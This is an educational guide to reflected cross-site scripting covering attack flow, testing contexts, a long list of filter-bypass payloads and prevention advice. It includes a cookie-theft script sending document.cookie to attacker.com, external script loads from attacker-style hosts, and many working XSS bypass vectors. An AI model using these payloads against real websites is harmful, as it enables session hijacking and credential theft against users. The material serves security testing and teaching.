# Comprehensive Guide to Reflected Cross-Site Scripting (XSS)

## Introduction to Reflected XSS

Reflected Cross-Site Scripting (XSS) is a client-side code injection attack where malicious scripts are reflected off a web application to the victim's browser. Unlike stored XSS where the payload persists on the server, reflected XSS is non-persistent - the malicious script comes from the current HTTP request and is immediately executed in the victim's browser .

This vulnerability occurs when:
1. User input is included in server responses without proper validation/sanitization
2. The input contains executable JavaScript that gets interpreted by the browser
3. An attacker tricks a victim into clicking a specially crafted link

Reflected XSS accounts for approximately 75% of all XSS vulnerabilities found in real-world applications . It's also called "first-order XSS" because the attack payload is delivered and executed via a single request-response cycle.

## How Reflected XSS Works

The attack flow typically involves three stages:

1. **Attack Design**: The attacker crafts a malicious URL containing JavaScript payload
2. **Social Engineering**: Victim is tricked into clicking the link (via email, forum post, etc.)
3. **Payload Execution**: Victim's browser processes the malicious script in the application's security context

Example attack chain:
1. Attacker finds vulnerable parameter: `https://example.com/search?query=test`
2. Creates malicious URL: `https://example.com/search?query=<script>alert(1)</script>`
3. Victim clicks the link
4. Server reflects the script in response: `<div>Results for: <script>alert(1)</script></div>`
5. Victim's browser executes the JavaScript 

## Impact of Reflected XSS

Successful exploitation can lead to:

- **Session Hijacking**: Stealing cookies/session tokens to impersonate victims 
- **Account Takeover**: Capturing login credentials via fake forms 
- **Malware Distribution**: Forcing downloads of malicious files 
- **Phishing Attacks**: Modifying page content to deceive users 
- **Keylogging**: Monitoring user keystrokes 
- **UI Redressing**: Creating fake interfaces (clickjacking) 

Example of a dangerous payload:
```javascript
<script>
  var i=new Image;
  i.src="http://attacker.com/steal?cookie="+document.cookie;
</script>
```
This sends the victim's session cookie to the attacker's server .

## Testing for Reflected XSS

### Black-Box Testing Methodology

#### 1. Detect Input Vectors
Identify all user-controllable inputs including:
- URL parameters (GET)
- Form fields (POST)
- HTTP headers (User-Agent, Referer, etc.)
- Hidden form fields
- Radio button/selection values 

Tools: Browser developer tools, web proxies (Burp Suite, OWASP ZAP)

#### 2. Analyze Input Vectors
Test each parameter with XSS probe strings:
- Basic test: `<script>alert(1)</script>`
- Attribute test: `" onmouseover="alert(1)`
- Protocol test: `javascript:alert(1)`
- Encoded test: `%3Cscript%3Ealert(1)%3C/script%3E` 

#### 3. Verify Impact
Check responses for:
- Unfiltered special characters (`<`, `>`, `"`, `'`)
- Improper encoding/escaping
- Context where input appears (HTML, JavaScript, attribute) 

### Testing Contexts

Reflected XSS can appear in different contexts requiring different exploitation techniques:

#### 1. HTML Context
Input appears directly in HTML:
```html
<div>USER_INPUT</div>
```
Test with: `<script>alert(1)</script>`

#### 2. HTML Attribute Context
Input within tag attributes:
```html
<input value="USER_INPUT">
```
Test with: `" onmouseover="alert(1)`

#### 3. JavaScript Context
Input within script blocks:
```javascript
var searchTerm = 'USER_INPUT';
```
Test with: `';alert(1);//` 

#### 4. URL Context
Input used in URLs/href attributes:
```html
<a href="USER_INPUT">Click</a>
```
Test with: `javascript:alert(1)` 

## Bypassing XSS Filters

Modern applications often implement filters to block XSS attacks. Here are common bypass techniques:

### 1. Case Variation
Bypass case-sensitive filters:
```html
<ScRiPt>alert(1)</ScRiPt>
```

### 2. Tag Attribute Attacks
Use event handlers instead of script tags:
```html
" onfocus="alert(1) autofocus="
```

### 3. Encoding Techniques
- HTML entities: `&lt;script&gt;alert(1)&lt;/script&gt;`
- Hex encoding: `\x3cscript\x3ealert(1)\x3c/script\x3e`
- Unicode: `\u003cscript\u003ealert(1)\u003c/script\u003e` 

### 4. Null Byte Injection
Insert null bytes to break filters:
```html
<scri%00pt>alert(1)</script>
```

### 5. Malformed Tags
Exploit browser tolerance for broken HTML:
```html
<<script>alert(1)//<</script>
```

### 6. JavaScript Functions
Use alternative JavaScript execution methods:
```javascript
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
```

### 7. Protocol Resolution
Bypass URL filters:
```html
<iframe src=//xss.rocks/script.js>
```

### 8. Whitespace Tricks
Insert tabs/newlines:
```javascript
jav%09ascript:alert(1)
```

### 9. Nested Attacks
For non-recursive filters:
```html
<scr<script>ipt>alert(1)</script>
```

### 10. External Script Loading
Reference external scripts:
```html
<script src=https://attacker.com/xss.js></script>
```



## Advanced Bypass Techniques

### 1. Base64 Encoding
```html
<svg onload=eval(atob('YWxlcnQoMSk='))>
```
(Decodes to `alert(1)`) 

### 2. Template Literals
Avoid quote filtering:
```html
<svg onload=alert`1`>
```

### 3. HTML5 Features
New HTML5 vectors:
```html
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

### 4. Dynamic Property Loading
```javascript
document.body.style.backgroundImage = "url(javascript:alert(1))";
```

### 5. ECMAScript 6 Features
Use arrow functions:
```javascript
setTimeout(()=>alert(1))
```



## Filter Bypass Examples

### Bypassing Script Tag Filters
Original filter blocks: `<script>alert(1)</script>`

Bypasses:
```html
<scr<script>ipt>alert(1)</script>
<img/src=1 onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
```

### Bypassing Attribute Filters
Original filter blocks: `" onmouseover="alert(1)`

Bypasses:
```html
'autofocus onfocus=alert(1) x='
`onmouseover=alert(1)
```

### Bypassing JavaScript Filters
Original filter blocks: `alert(1)`

Bypasses:
```javascript
eval('al'+'ert(1)')
[1].map(alert)
top['al'+'ert'](1)
```



## Tools for Testing Reflected XSS

1. **Burp Suite** - Intercept and modify requests 
2. **OWASP ZAP** - Automated scanning 
3. **XSS Hunter** - Blind XSS detection 
4. **BeEF** - Browser exploitation framework 
5. **HackVertor** - Multiple encoding options 

## Prevention Recommendations

1. **Input Validation**:
   - Whitelist allowed characters
   - Reject known malicious patterns 

2. **Output Encoding**:
   - Context-sensitive encoding (HTML, JS, CSS)
   - Use libraries like OWASP ESAPI 

3. **Content Security Policy (CSP)**:
   - Restrict script sources
   - Disable inline JavaScript 

4. **Secure Coding Practices**:
   - Avoid inserting user input into HTML/JS
   - Use safe DOM manipulation methods 

5. **Regular Testing**:
   - Automated scanning
   - Manual penetration testing 

## Conclusion

Reflected XSS remains one of the most prevalent web vulnerabilities due to improper input handling. While filters provide some protection, they can often be bypassed using creative techniques. Effective defense requires a combination of input validation, output encoding, and security-aware development practices. Regular testing with both automated tools and manual techniques is essential to identify and remediate these vulnerabilities before attackers can exploit them.

For further reading, consult the OWASP XSS Filter Evasion Cheat Sheet  and The Web Application Hacker's Handbook .